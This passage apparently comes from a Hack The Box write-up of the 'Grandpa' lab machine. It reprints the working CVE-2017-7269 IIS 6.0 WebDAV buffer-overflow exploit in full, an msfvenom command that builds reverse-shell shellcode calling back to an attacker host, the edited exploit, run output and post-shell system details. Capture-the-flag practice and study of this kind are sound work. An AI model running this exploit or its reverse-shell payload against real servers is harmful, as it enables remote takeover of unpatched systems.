5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81</span><span class="s1">&#39;</span>
+
+<span class="n">shellcode</span><span class="o">=</span><span class="s1">&#39;VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA&#39;</span>
+
+<span class="n">pay</span><span class="o">+=</span><span class="n">shellcode</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+<span class="nb">print</span> <span class="n">pay</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>  
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">80960</span><span class="p">)</span>  
+
+<span class="nb">print</span> <span class="n">data</span> 
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span>
+</pre></div>
+
+
+<p>First off we need to change the IP from 127.0.0.1 to our target IP, that is 10.10.10.14. Furthermore, as per the comments, if successful the exploit will open <code>calc.exe</code>. We then need to generate a new shellcode and replace it:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.9 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -e x86/shikata_ga_nai -f python -v shellcode
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
+<span class="go">[-] No arch selected, selecting arch: x86 from the payload</span>
+<span class="go">Found 1 compatible encoders</span>
+<span class="go">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span>
+<span class="go">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span>
+<span class="go">x86/shikata_ga_nai chosen with final size 351</span>
+<span class="go">Payload size: 351 bytes</span>
+<span class="go">Final size of python file: 1965 bytes</span>
+<span class="go">shellcode =  b&quot;&quot;</span>
+<span class="go">shellcode += b&quot;\xdd\xc6\xba\x9e\xc3\xbd\x54\xd9\x74\x24\xf4&quot;</span>
+<span class="go">shellcode += b&quot;\x58\x33\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04&quot;</span>
+<span class="go">shellcode += b&quot;\x03\xce\xd0\x5f\xa1\x12\x3e\x1d\x4a\xea\xbf&quot;</span>
+<span class="go">shellcode += b&quot;\x42\xc2\x0f\x8e\x42\xb0\x44\xa1\x72\xb2\x08&quot;</span>
+<span class="go">shellcode += b&quot;\x4e\xf8\x96\xb8\xc5\x8c\x3e\xcf\x6e\x3a\x19&quot;</span>
+<span class="go">shellcode += b&quot;\xfe\x6f\x17\x59\x61\xec\x6a\x8e\x41\xcd\xa4&quot;</span>
+<span class="go">shellcode += b&quot;\xc3\x80\x0a\xd8\x2e\xd0\xc3\x96\x9d\xc4\x60&quot;</span>
+<span class="go">shellcode += b&quot;\xe2\x1d\x6f\x3a\xe2\x25\x8c\x8b\x05\x07\x03&quot;</span>
+<span class="go">shellcode += b&quot;\x87\x5f\x87\xa2\x44\xd4\x8e\xbc\x89\xd1\x59&quot;</span>
+<span class="go">shellcode += b&quot;\x37\x79\xad\x5b\x91\xb3\x4e\xf7\xdc\x7b\xbd&quot;</span>
+<span class="go">shellcode += b&quot;\x09\x19\xbb\x5e\x7c\x53\xbf\xe3\x87\xa0\xbd&quot;</span>
+<span class="go">shellcode += b&quot;\x3f\x0d\x32\x65\xcb\xb5\x9e\x97\x18\x23\x55&quot;</span>
+<span class="go">shellcode += b&quot;\x9b\xd5\x27\x31\xb8\xe8\xe4\x4a\xc4\x61\x0b&quot;</span>
+<span class="go">shellcode += b&quot;\x9c\x4c\x31\x28\x38\x14\xe1\x51\x19\xf0\x44&quot;</span>
+<span class="go">shellcode += b&quot;\x6d\x79\x5b\x38\xcb\xf2\x76\x2d\x66\x59\x1f&quot;</span>
+<span class="go">shellcode += b&quot;\x82\x4b\x61\xdf\x8c\xdc\x12\xed\x13\x77\xbc&quot;</span>
+<span class="go">shellcode += b&quot;\x5d\xdb\x51\x3b\xa1\xf6\x26\xd3\x5c\xf9\x56&quot;</span>
+<span class="go">shellcode += b&quot;\xfa\x9a\xad\x06\x94\x0b\xce\xcc\x64\xb3\x1b&quot;</span>
+<span class="go">shellcode += b&quot;\x42\x34\x1b\xf4\x23\xe4\xdb\xa4\xcb\xee\xd3&quot;</span>
+<span class="go">shellcode += b&quot;\x9b\xec\x11\x3e\xb4\x87\xe8\xa9\xb1\x5d\xfc&quot;</span>
+<span class="go">shellcode += b&quot;\x20\xae\x63\x00\x32\x95\xed\xe6\x5e\xf9\xbb&quot;</span>
+<span class="go">shellcode += b&quot;\xb1\xf6\x60\xe6\x49\x66\x6c\x3c\x34\xa8\xe6&quot;</span>
+<span class="go">shellcode += b&quot;\xb3\xc9\x67\x0f\xb9\xd9\x10\xff\xf4\x83\xb7&quot;</span>
+<span class="go">shellcode += b&quot;\x00\x23\xab\x54\x92\xa8\x2b\x12\x8f\x66\x7c&quot;</span>
+<span class="go">shellcode += b&quot;\x73\x61\x7f\xe8\x69\xd8\x29\x0e\x70\xbc\x12&quot;</span>
+<span class="go">shellcode += b&quot;\x8a\xaf\x7d\x9c\x13\x3d\x39\xba\x03\xfb\xc2&quot;</span>
+<span class="go">shellcode += b&quot;\x86\x77\x53\x95\x50\x21\x15\x4f\x13\x9b\xcf&quot;</span>
+<span class="go">shellcode += b&quot;\x3c\xfd\x4b\x89\x0e\x3e\x0d\x96\x5a\xc8\xf1&quot;</span>
+<span class="go">shellcode += b&quot;\x27\x33\x8d\x0e\x87\xd3\x19\x77\xf5\x43\xe5&quot;</span>
+<span class="go">shellcode += b&quot;\xa2\xbd\x74\xac\xee\x94\x1c\x69\x7b\xa5\x40&quot;</span>
+<span class="go">shellcode += b&quot;\x8a\x56\xea\x7c\x09\x52\x93\x7a\x11\x17\x96&quot;</span>
+<span class="go">shellcode += b&quot;\xc7\x95\xc4\xea\x58\x70\xea\x59\x58\x51&quot;</span>
+</pre></div>
+
+
+<p>The edited exploit looks like this:</p>
+<div class="highlight"><pre><span></span><span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with &quot;If: &lt;http://&quot; in a PROPFIND request, as exploited in the wild in July or August 2016.</span>
+
+<span class="sd">Additional Information: the ScStoragePathFromUrl function is called twice</span>
+<span class="sd">Vulnerability Type: Buffer overflow</span>
+<span class="sd">Vendor of Product: Microsoft</span>
+<span class="sd">Affected Product Code Base: Windows Server 2003 R2</span>
+<span class="sd">Affected Component: ScStoragePathFromUrl</span>
+<span class="sd">Attack Type: Remote</span>
+<span class="sd">Impact Code execution: true</span>
+<span class="sd">Attack Vectors: crafted PROPFIND data</span>
+
+<span class="sd">Has vendor confirmed or acknowledged the vulnerability?:true</span>
+
+<span class="sd">Discoverer:Zhiniang Peng and Chen Wu.</span>
+<span class="sd">Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="c1">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span>
+<span class="c1">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span>
+<span class="c1">#-----------Email: edwardz@foxmail.com</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>  
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>  
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;10.10.10.14&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>  
+
+<span class="n">pay</span><span class="o">=</span><span class="s1">&#39;PROPFIND / HTTP/1.1</span><span class="se">\r\n</span><span class="s1">Host: localhost</span><span class="se">\r\n</span><span class="s1">Content-Length: 0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;If: &lt;http://localhost/aaaaaaa&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac</span><span class="s1">&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39; (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81</span><span class="s1">&#39;</span>
+
+<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdd\xc6\xba\x9e\xc3\xbd\x54\xd9\x74\x24\xf4</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x58\x33\xc9\xb1\x52\x31\x50\x17\x83\xc0\x04</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\xce\xd0\x5f\xa1\x12\x3e\x1d\x4a\xea\xbf</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\xc2\x0f\x8e\x42\xb0\x44\xa1\x72\xb2\x08</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4e\xf8\x96\xb8\xc5\x8c\x3e\xcf\x6e\x3a\x19</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfe\x6f\x17\x59\x61\xec\x6a\x8e\x41\xcd\xa4</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc3\x80\x0a\xd8\x2e\xd0\xc3\x96\x9d\xc4\x60</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe2\x1d\x6f\x3a\xe2\x25\x8c\x8b\x05\x07\x03</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x87\x5f\x87\xa2\x44\xd4\x8e\xbc\x89\xd1\x59</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x37\x79\xad\x5b\x91\xb3\x4e\xf7\xdc\x7b\xbd</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x09\x19\xbb\x5e\x7c\x53\xbf\xe3\x87\xa0\xbd</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3f\x0d\x32\x65\xcb\xb5\x9e\x97\x18\x23\x55</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9b\xd5\x27\x31\xb8\xe8\xe4\x4a\xc4\x61\x0b</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9c\x4c\x31\x28\x38\x14\xe1\x51\x19\xf0\x44</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6d\x79\x5b\x38\xcb\xf2\x76\x2d\x66\x59\x1f</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x82\x4b\x61\xdf\x8c\xdc\x12\xed\x13\x77\xbc</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5d\xdb\x51\x3b\xa1\xf6\x26\xd3\x5c\xf9\x56</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfa\x9a\xad\x06\x94\x0b\xce\xcc\x64\xb3\x1b</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x42\x34\x1b\xf4\x23\xe4\xdb\xa4\xcb\xee\xd3</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x9b\xec\x11\x3e\xb4\x87\xe8\xa9\xb1\x5d\xfc</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x20\xae\x63\x00\x32\x95\xed\xe6\x5e\xf9\xbb</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb1\xf6\x60\xe6\x49\x66\x6c\x3c\x34\xa8\xe6</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb3\xc9\x67\x0f\xb9\xd9\x10\xff\xf4\x83\xb7</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x23\xab\x54\x92\xa8\x2b\x12\x8f\x66\x7c</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x73\x61\x7f\xe8\x69\xd8\x29\x0e\x70\xbc\x12</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8a\xaf\x7d\x9c\x13\x3d\x39\xba\x03\xfb\xc2</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x86\x77\x53\x95\x50\x21\x15\x4f\x13\x9b\xcf</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3c\xfd\x4b\x89\x0e\x3e\x0d\x96\x5a\xc8\xf1</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x27\x33\x8d\x0e\x87\xd3\x19\x77\xf5\x43\xe5</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xa2\xbd\x74\xac\xee\x94\x1c\x69\x7b\xa5\x40</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x8a\x56\xea\x7c\x09\x52\x93\x7a\x11\x17\x96</span><span class="s2">&quot;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc7\x95\xc4\xea\x58\x70\xea\x59\x58\x51</span><span class="s2">&quot;</span>
+
+<span class="n">pay</span><span class="o">+=</span><span class="n">shellcode</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span>
+<span class="nb">print</span> <span class="n">pay</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>  
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">80960</span><span class="p">)</span>  
+
+<span class="nb">print</span> <span class="n">data</span> 
+<span class="n">sock</span><span class="o">.</span><span class="n">close</span>
+</pre></div>
+
+
+<p>Now I start a netcat listener on port 443 and run the exploit:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~/Documents/HTB/boxes/results/10.10.10.14/exploit$</span> python2 <span class="m">41738</span>.py
+<span class="go">PROPFIND / HTTP/1.1</span>
+<span class="go">Host: localhost</span>
+<span class="go">Content-Length: 0</span>
+<span class="go">If: &lt;http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬&gt; (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块</span>
+<span class="go">넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁ýTt$X3ɱR1P_&gt;JBBDNŌ&gt;n:oYajAÀ</span>
+<span class="go">2e˵#U&#39;1Ja7y[N{  ^|S㇠?</span>
+<span class="go">         L1(8QDmy[8v-fYKaߌw]Q;&amp;\V</span>
+<span class="go">Z&#39;3wC墽ti{@V|   RzǕXpYXQ&gt;        d4話] c2^`Ifl&lt;4g#T+f|sai)p}=9wSP!O&lt;K&gt;</span>
+
+
+<span class="go">HTTP/1.1 400 Bad Request</span>
+<span class="go">Content-Type: text/html</span>
+<span class="go">Date: Fri, 02 Oct 2020 10:08:45 GMT</span>
+<span class="go">Connection: close</span>
+<span class="go">Content-Length: 20</span>
+
+<span class="go">&lt;h1&gt;Bad Request&lt;/h1&gt;</span>
+</pre></div>
+
+
+<p>Nothing happened! No hits at all on the listener.</p>
+<p>I started doing some research and I found out that the vulnerability in question is <a href="https://www.cvedetails.com/cve/CVE-2017-7269/">CVE-2017-7269</a>.I also found a <a href="https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl">metasploit module</a> for it, and although I want to avoid using it, is always a good indication that the exploit has been tested and been around for a while.</p>
+<p>I then found another exploit on <a href="https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell">github</a> and I decided to give it a try. The exploit is very similar to the one I tried earlier but it comes with a predefined shellcode, so all we have to do is to provided target IP address and port and source IP address and port. Once I run the exploit I reveice a reverse shell as expected:</p>
+<p><img alt="" src="../images/grandpa-foothold.png"></p>
+<div class="highlight"><pre><span></span><span class="go">C:\Documents and Settings&gt;systeminfo</span>
+<span class="go">systeminfo</span>
+
+<span class="go">Host Name:                 GRANPA</span>
+<span class="go">OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition</span>
+<span class="go">OS Version:                5.2.3790 Service Pack 2 Build 3790</span>
+<span class="go">OS Manufacturer:           Microsoft Corporation</span>
+<span class="go">OS Configuration:          Standalone Server</span>
+<span class="go">OS Build Type:             Uniprocessor Free</span>
+<span class="go">Registered Owner:          HTB</span>
+<span class="go">Registered Organization:   HTB</span>
+<span class="go">Product ID:                69712-296-0024942-44782</span>
+<span class="go">Original Install Date:     4/12/2017, 5:07:40 PM</span>
+<span class="go">System Up Time:            0 Days, 0 Hours, 57 Minutes, 58 Seconds</span>
+<span class="go">System Manufacturer:       VMware, Inc.</span>
+<span class="go">System Model:              VMware Virtual Platform</span>
+<span class="go">System Type:               X86-based PC</span>
+<span class="go">Processor(s):              1 Processor(s) Installed.</span>
+<span class="go">                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz</span>
+<span class="go">BIOS Version:              INTEL  - 6040000</span>
+<span class="go">Windows Directory:         C:\WINDOWS</span>
+<span class="go">System Directory:          C:\WINDOWS\system32</span>
